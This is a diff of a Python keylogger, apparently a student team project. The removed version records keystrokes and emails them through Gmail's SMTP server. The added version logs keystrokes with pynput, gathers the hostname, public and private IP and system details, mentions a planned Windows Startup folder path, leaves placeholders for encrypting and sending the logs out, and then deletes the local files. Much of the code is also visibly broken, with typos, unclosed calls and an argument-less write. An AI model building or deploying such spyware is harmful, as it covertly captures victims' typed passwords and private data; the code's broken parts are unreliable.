@@ -1,107 +1,151 @@
-# !/usr/bin/python
-__author__ = 'Neta Shiff & Connor Blaszkiewicz'
-#This program is the Keylooger 
-#pip3 install keyboard
-import keyboard
-import smtplib # for sending email using SMTP protocol (gmail)- to help check out program
-from threading import Timer
-from datetime import datetime
+#Team myKeys
+#keylogger.py
+#Connor Blaszkiewicz and Neta Shiff
 
-class keylog:
-    #initalize the method to sent a report and check dates,	
-    def __init__(self, interval, report_method="TBD"):
-		#pass SEND_REPORT_EVERY to interval
-        self.interval = interval
-        self.report_method = report_method
-        # this is the string variable that contain
-        self.log = ""
-        # the keystrokes within `self.interval`
-        # record start & end datetimes
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+# Libraries Used
+import socket
+import platform
+from pynput.keyboard import Key, Listener
+import time
+import os
+import getpass
+from requests import get
+import multiprocessing
 
-    def Callback(self, event):
-        #This callback is invoked whenever a keyboard event is occured
-        name = event.name
-        if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        # finally, add the key name to our global `self.log` variable
-        self.log += nam
 
-        ### updates the filename to the date and time the keys are recorded ###
-	def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-	### This method will not be used, instead we will use a google KM Server ###
-	def sendmail(self, email, password, message):
-        # manages a connection to the SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
-        # terminates the session
-        server.quit(
+loggedKeys = "loggedKeys.txt"
+systemInfo = "systemInfo.txt"
 
-    	#report to file create the log file in the current dir, with the current key logger in the self log var
-	def report_to_file(self):"
-        # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")    
+loggedKeysEncrypted = "loggedKeysEncrypted.txt"
+systemInfoEncrypted = "systemInfoEncrypted.txt"
 
-	def report(self):
-        """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
-        """
-        if self.log:
-            # if there is something in log, report it
-            self.end_dt = datetime.now()
-            # update `self.filename`
-            self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
-            # if you want to print in the console, uncomment below line
-            # print(f"[{self.filename}] - {self.log}")
-            self.start_dt = datetime.now()
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        # set the thread as daemon (dies when main thread die)
-        timer.daemon = True
-        # start the timer
-        timer.start()
+path = "" #"C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
+extend = "\\"
+extendedPath = path + extend
 
-	### Records start date and time and begins writing keys ###
-	def start(self):
-        # record the start datetime
-        self.start_dt = datetime.now()
-        # start the keylogger
-        keyboard.on_release(callback=self.callback)
-        # start reporting the keyl
-        self.report()
-        # block the current thread, wait until CTRL+C is pressed
-        keyboard.wait()
 
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+
+
+### This creates a document that contains useful system information and specifications ###
+def getSystemInfo():
+    #needs error handling
+    with open(extendedPath + systemInfo, "a") as f:
+        hostname = socket.gethostname()
+        # Writes hostname
+        f.write("Hostname: " + hostname + '\n')
+
+        privateIP = socket.gethostbyname(hostname)
+        try:
+            publicIP = get("https://api.ipify.org").text
+            f.write("Public IP address: " + publicIP + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve public IP address" + '\n')
+
+        # Writes Private IP
+        f.write("private IP address: " + privateIP + '\n')
+        # Writes Machine Name
+        f.write("Machine: " + platform.machine() + '\n')
+        # Writes System Type
+        f.write("System: "+ platform.system() + '\n')
+        # Writes System Version
+        f.write("Version: "+ platform.version() +'\n')
+        # Writes Processor
+        f.write("Processor: " + platform.processor() + '\n')
+
+getSystemInfo()
+
+### Run Length Variables ###
+numberOfLogs = 0
+logTime = 15 #This should be changed to 24 hours equivalent (I think)
+currentTime = time.time()
+endTime = currentTime + logTime #Will result in 24 hours after currentTime
+
+
+### Establishes how long the program will record keys ###
+      ### All Key Recording Processes are below ###
+while currentTime < endTime:
+    count = 0
+    keys = []
+
+    ### When a key is pressed ###
+    def onPress(key):
+        global keys
+        global count
+        global currentTime
+
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            writeToFile(keys)
+            keys = []
+
+    ### Writes keys to file ###
+    def writeToFile(keys):
+        #needs error handling
+        with open(extendedPath + loggedKeys, "a") as f:
+            for key in keys:
+                k = str(key.replace("'",""))
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+    ### When a key is released ###
+    def onRelease(key):
+        # This may not be needed
+        if key == Key.esc:
+            return False 
+        if currentTime > endTime:
+            return False
+
+    with Listener(onPress = onPress, onRelease = onRelease) as listener:
+        listener.join()
+
+    if currentTime > endTime:
+        #needs error handling
+        with open(extendedPath + loggedKeys, "w") as f:
+            f.write()
         
+        numberOfLogs += 1
+
+        currentTime = time.time()
+        endTime = time.time() + logTime
+
+    
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+### ENCRYPT FILES HERE ###
+
+
+### Deletes Files After they are Encrypted and Sent ###
+deleteFiles = [systemInfo,loggedKeys]
+for file in deleteFiles:
+    os.remove(extendedPath + file)
+
+            
+
